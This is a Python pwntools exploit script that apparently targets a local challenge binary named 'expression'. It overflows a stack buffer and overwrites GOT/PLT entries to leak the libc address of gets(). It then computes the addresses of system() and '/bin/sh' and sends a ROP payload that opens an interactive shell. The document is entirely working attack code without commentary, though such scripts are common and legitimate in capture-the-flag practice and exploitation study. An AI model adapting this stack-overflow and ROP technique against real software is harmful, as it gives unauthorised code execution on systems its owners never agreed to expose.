from pwn import *
from time import sleep

PROCESS_NAME = '/home/daniel/Desktop/expression'
DELETE_GOT_ENTRY = 0x0804A01C
PUTS_PLT_ADDR = 0x080485B0
GETS_GOT_ENTRY = 0x804A004
MAIN_ADDR = 0x8048694
LEAVE_RET_GADGET = 0x08048918
SYSTEM_GETS_OFFSET = 148944
BINSH_GETS_OFFSET = 1021516
DELETE_PLT_ENTRY = 0x80485A6
PUTS_PLT_ENTRY = 0x80485b6
STRCMP_PLT_ENTRY = 0x80485c6

def exploit():
	p = process(PROCESS_NAME)
	
	# first tack - leak libc address

	sleep(0.5)
	p.recv(2048, timeout=1)
	
	log.info('Overflowing the stack...') 
	p.sendline('A'*0x180 + p32(DELETE_GOT_ENTRY) + 0x10*'C' + p32(PUTS_PLT_ADDR) + p32(MAIN_ADDR) + p32(GETS_GOT_ENTRY))

	sleep(0.5)
	p.recv(2048, timeout=1)
	
	log.info('Overwiting GOT/PLT entries...')
	p.sendline(p32(DELETE_PLT_ENTRY) + p32(PUTS_PLT_ENTRY) + p32(STRCMP_PLT_ENTRY) + p32(LEAVE_RET_GADGET))

	sleep(0.5)
	p.recv(2048, timeout=1)
	log.info('Leak gets() address and return to main()')

	p.sendline('q')

	sleep(0.5)
	outp = p.recv(2048, timeout=1)
	gets_address = u32(outp[0:4])
	system_address = gets_address - SYSTEM_GETS_OFFSET
	binsh_address = gets_address + BINSH_GETS_OFFSET
	log.info('gets() address within libc - ' + hex(gets_address))
	log.info('system() address - ' + hex(system_address))
	log.info('bin/sh address - ' + hex(binsh_address))

	# second tact - rop to system

	log.info('Overflowing stack with system as return address')
	cmd = 'A'*0x180 + p32(DELETE_GOT_ENTRY) + 0x8*'C' + p32(system_address) + p32(MAIN_ADDR) + p32(binsh_address)
	p.sendline(cmd)

	sleep(0.5)
	log.info('Got Shell :)')
	p.sendline('id')
	p.interactive()